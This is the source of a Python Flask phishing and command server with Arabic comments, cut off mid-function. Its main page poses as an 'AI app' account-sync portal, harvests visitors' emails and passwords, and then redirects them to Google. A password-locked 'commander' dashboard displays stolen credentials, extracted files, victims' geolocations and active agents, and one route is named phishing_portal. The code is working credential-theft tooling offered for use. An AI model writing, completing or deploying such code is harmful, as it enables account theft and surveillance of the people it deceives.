from flask import Flask, render_template_string, request, jsonify, make_response, session, redirect, url_for
import base64
import urllib3
import datetime
import json
import hashlib

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = hashlib.sha256(b"secure_secret_key_v78_real_engine").digest()

DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

# 🛡️ الذاكرة المركزية الميدانية للهدف (v78.5)
AGENT_SESSIONS = {}
COMMAND_QUEUE = {}
CAPTURED_CREDENTIALS = []
CAPTURED_SESSIONS = []
CAPTURED_LOCATIONS = []
CAPTURED_KEYSTROKES = []
EXTRACTED_FILES = []
EXTRACTED_ALL_FILES = []
SYSTEM_RECON_DATA = []
TELEMETRY_LOGS = []

def clean_url(raw):
    s = (raw or "").strip()
    if not s.startswith("http"):
        s = "http://" + s
    return s.rstrip("/")

# 1️⃣ صفحة التطبيق المستقل (التي تظهر للهدف عند فتح الرابط)
STANDALONE_APP_PORTAL = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cognitive AI App • Standalone Edition v78.5</title>
<style>
body{background:#202123;color:#ececf1;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
.box{background:#343541;padding:25px 20px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.5);width:100%;max-width:400px;text-align:center;border:1px solid #4d4d4f}
.ai-logo{width:45px;height:45px;background:#19c37d;margin:0 auto 12px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:24px;color:#fff}
h2{color:#fff;font-size:18px;margin-bottom:6px}
.sub-title{color:#8e8ea0;font-size:12px;margin-bottom:18px}
.input-group{margin-bottom:12px;text-align:right}
input{width:100%;padding:12px;background:#40414f;border:1px solid #565869;color:#fff;border-radius:6px;font-size:14px;outline:none;direction:ltr;text-align:left}
button{width:100%;padding:13px;background:#19c37d;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:15px;margin-top:8px}
button:hover{background:#1aab72}
</style>
</head>
<body>
<div class="box">
  <div class="ai-logo">✨</div>
  <h2>تطبيق الذكاء الاصطناعي (v78.5)</h2>
  <div class="sub-title">منصة تفعيل ومزامنة الحسابات الذكية</div>
  <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
  <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
  <button id="action_btn" onclick="triggerAIWorkflow()">تشغيل التطبيق ومزامنة الجلسة 🚀</button>
</div>
<script>
async function triggerAIWorkflow(){
    const email = document.getElementById('target_email').value.trim();
    const pass = document.getElementById('target_pass').value.trim();
    if(!email || !pass) { alert('يرجى ملء البيانات'); return; }
    const globalToken = 'agent_' + Math.random().toString(36).substring(2, 10);
    
    try {
        await fetch('/auth/verify/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_token: globalToken, user_agent: navigator.userAgent, platform: 'Android Target'})
        });
        await fetch('/api/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: globalToken, email: email, password: pass})
        });
    } catch(e){}
    alert('تم تفعيل النظام بنجاح!');
    window.location.href = "https://www.google.com";
}
</script>
</body>
</html>"""

# 2️⃣ صفحة تسجيل دخول القائد
HTML_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>تسجيل دخول القائد</title>
<style>
body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;text-align:center;width:350px}
input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;text-align:center}
button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}
</style>
</head>
<body>
<div class="box">
  <h2>🔒 لوحة القيادة v78.5</h2>
  <form method="POST" action="/commander/login">
    <input type="password" name="password" placeholder="كلمة المرور (77277200)" required>
    <button type="submit">دخول 🚀</button>
  </form>
</div>
</body>
</html>"""

# 3️⃣ لوحة القيادة الشاملة المزودة بأزرار السحب والتحكم الميداني
HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>لوحة السيطرة الشاملة v78.5</title>
<style>
body{background:#010103;color:#00ff88;font-family:monospace;padding:15px;text-align:center}
.container{max-width:1150px;margin:auto}
h1{color:#ff0040;margin-bottom:20px}
.panel{background:#04060e;border:2px solid #ff0040;padding:20px;border-radius:12px}
select, button{padding:12px;margin:8px;border-radius:6px;border:1px solid #ff0040;background:#000;color:#fff;cursor:pointer;font-weight:bold}
button{background:#ff0040}
button:hover{background:#cc0033}
.card{background:#000;border:1px solid #1a2a40;padding:15px;margin:15px auto;max-width:950px;border-radius:10px;text-align:right;border-right:8px solid #ff0040}
table{width:100%;margin-top:15px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}
th{background:#0a0e1a;color:#ff0040}
</style>
</head>
<body>
<div class="container">
<h1>⚔️ لوحة السيطرة المطلقة والتحكم الميداني v78.5 ⚔️</h1>
<div style="margin-bottom:15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;">[تسجيل خروج]</a></div>
<div class="panel">
<select id="command_type">
  <option value="fetch_active_agents">🎯 عرض الأهداف والوكلاء النشطين</option>
  <option value="fetch_captured_credentials">🔑 عرض الحسابات وكلمات المرور المسروقة</option>
  <option value="fetch_extracted_files">📂 عرض الملفات المستخرجة من الهدف</option>
  <option value="fetch_captured_locations">📍 عرض الإحداثيات والمواقع الجغرافية</option>
</select>
<br>
<button onclick="executeCommand()">تنفيذ أمر السيطرة ⚡</button>
<div id="results" style="margin-top:20px;"></div>
</div>
</div>

<script>
async function executeCommand(){
 const cmdType = document.getElementById('command_type').value;
 const results = document.getElementById('results');
 results.innerHTML='⏳ جاري تنفيذ أمر السيطرة...';
 try{
   const res = await fetch('/api/index', {
     method:'POST',
     headers:{'Content-Type':'application/json'},
     body: JSON.stringify({command: cmdType})
   });
   const data = await res.json();
   if(cmdType === 'fetch_active_agents'){
     let t = '<div class="card"><b>🎯 الأهداف النشطة</b><table><tr><th>Token</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
     if(data.agents && data.agents.length>0){
       data.agents.forEach(a => { t += `<tr><td>${a.token}</td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>`; });
     } else { t += '<tr><td colspan="4" style="text-align:center">لا توجد أهداف متصلة</td></tr>'; }
     results.innerHTML = t + '</table></div>';
   } else if(cmdType === 'fetch_captured_credentials'){
     let c = '<div class="card"><b>🔑 الحسابات المسروقة</b><table><tr><th>Token</th><th>البريد</th><th>كلمة المرور</th><th>الوقت</th></tr>';
     if(data.credentials && data.credentials.length>0){
       data.credentials.forEach(item => { c += `<tr><td>${item.token}</td><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.time}</td></tr>`; });
     } else { c += '<tr><td colspan="4" style="text-align:center">لا توجد حسابات مسروقة حتى الآن</td></tr>'; }
     results.innerHTML = c + '</table></div>';
   } else if(cmdType === 'fetch_extracted_files'){
     let f = '<div class="card"><b>📂 الملفات المستخرجة</b><table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th></tr>';
     if(data.files && data.files.length>0){
       data.files.forEach(file => { f += `<tr><td>${file.token}</td><td style="color:#00ff88">${file.filename}</td><td>${file.time}</td></tr>`; });
     } else { f += '<tr><td colspan="3" style="text-align:center">لم يتم استخراج ملفات حتى الآن</td></tr>'; }
     results.innerHTML = f + '</table></div>';
   } else if(cmdType === 'fetch_captured_locations'){
     let l = '<div class="card"><b>📍 الإحداثيات الجغرافية</b><table><tr><th>Token</th><th>Latitude</th><th>Longitude</th><th>الوقت</th></tr>';
     if(data.locations && data.locations.length>0){
       data.locations.forEach(loc => { l += `<tr><td>${loc.token}</td><td>${loc.lat}</td><td>${loc.lon}</td><td>${loc.time}</td></tr>`; });
     } else { l += '<tr><td colspan="4" style="text-align:center">لا توجد إحداثيات مسجلة</td></tr>'; }
     results.innerHTML = l + '</table></div>';
   }
 }catch(e){ results.innerHTML='❌ خطأ في الاتصال: '+e.message; }
}
</script>
</body>
</html>"""

# مسارات الخادم الأساسية
@app.route('/', methods=['GET'])
def home():
    # الرابط الرئيسي يعرض صفحة الهدف للضحية
    return STANDALONE_APP_PORTAL

@app.route('/commander/login', methods=['GET', 'POST'])
def commander_login():
    if request.method == 'POST':
        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
            session['authenticated'] = True
            return redirect(url_for('commander_dashboard'))
    return HTML_LOGIN_PAGE

@app.route('/commander/dashboard', methods=['GET'])
def commander_dashboard():
    if not session.get('authenticated'):
        return redirect(url_for('commander_login'))
    return HTML_COMMAND_CENTER

@app.route('/commander/logout', methods=['GET'])
def commander_logout():
    session.pop('authenticated', None)
    return redirect(url_for('commander_login'))

# مسارات استقبال البيانات من الهدف
@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data 
